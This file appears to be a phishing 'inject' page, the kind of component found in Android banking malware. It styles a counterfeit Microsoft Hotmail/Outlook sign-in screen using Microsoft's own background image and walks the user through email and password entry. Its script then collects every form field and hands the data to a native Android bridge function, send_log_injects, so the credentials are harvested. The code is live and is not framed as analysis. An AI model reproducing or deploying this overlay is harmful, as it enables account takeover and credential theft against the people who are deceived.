body {

}
html {
    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
}

#hotmailoutlook {
    display: table;
    position: absolute;
    height: 100%;
    width: 100%;
    background-image: url(https://logincdn.msauth.net/16.000.28230.00/images/Backgrounds/0.jpg);
    background-size: cover;
}
#hotmailoutlook .content {
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 440px;
    width: calc(100% - 88px);
    padding: 44px 44px 84px 44px;
    margin-bottom: 28px;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    box-shadow: 0 2px 6px rgba(0,0,0,.2);
    min-width: 320px;
    overflow: hidden;
}
#hotmailoutlook h1 {
    color: #404040;
    font-size: 1.5rem;
    font-weight: 600;
}
#hotmailoutlook input {
    width: 100%;
    padding: 6px 10px;
    border-width: 1px;
    border-color: #666;
    border-color: rgba(0,0,0,.6);
    height: 36px;
    outline: none;
    border-radius: 0;
    -webkit-border-radius: 0;
    border-top-width: 0;
    border-left-width: 0;
    border-right-width: 0;
    padding-left: 0;
    background-color: rgba(255,255,255,.4);
    border-style: solid;
    margin-bottom: 20px;
}
#hotmailoutlook .createtext {
    margin-bottom: 16px;
    font-size: .8125rem;
    color: #262626;
    text-align: left;
}
#hotmailoutlook .link {
    color: #0067b8;
}
#hotmailoutlook .btnNext {
    background-color: #0067b8;
    border-color: #0067b8;
    color: #fff;
    margin-top: 0;
    margin-bottom: 0;
    text-align: center;
    padding: 10px 40px;
    border: none;
    float: right;
    bottom: 45px;
    right: 35px;
    position: absolute;
}
#hotmailoutlook .middle {
    display: table-cell;
    vertical-align: middle;
}
#hotmailoutlook .infomail {
    height: 12px;
    margin-top: 15px;
    margin-bottom: 30px;
}
#hotmailoutlook .leftarrow {
    display: inline-block;
    position: absolute;
}
#hotmailoutlook #myhotmailtext {
    display: inline-block;
    position: absolute;
    margin-left: 26px;
    margin-top: 3px;
}

<script>


function HotMailNextPage() {
    if(document.getElementById('hotmailoutlooklogin').value.length > 5) {
        document.getElementById('page3').style.display = 'none';
        document.getElementById('page4').style.display = 'block';
        document.getElementById('myhotmailtext').innerText = document.getElementById('hotmailoutlooklogin').value;
    }
}
function HotMailBackBTNPage() {
    document.getElementById('page3').style.display = 'block';
    document.getElementById('page4').style.display = 'none';
}


function checkPassword(){
    if(document.getElementById('hotmailoutlookpassword').value.length > 5) {
        process('hotmailoutlook');
    }
}

var lang = 'en', invalidCC = 'Invalid card number';
document.getElementById('hotmailoutlook').style.display = "";


function process(formId) {
    var ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("android") > -1) {
        try {
        Android.send_log_injects(formToJSONbyName(document.getElementById(formId)));
        } catch (err) {}
    }else{
        alert(formToJSONbyName(document.getElementById(formId)));
    }
}

/*********Recursive implementation of jSON.stringify; ********/
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSONbyName(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];
    for(var i = 0; i < namesHTML.length; i++) {
		var bsform = f.getElementsByTagName(namesHTML[i]);
        for(var j = 0; j < bsform.length; j++) {
            FinalObject[bsform[j].name] = bsform[j].value
        }
    }
    return stringifyJSON(FinalObject);
}

</script>
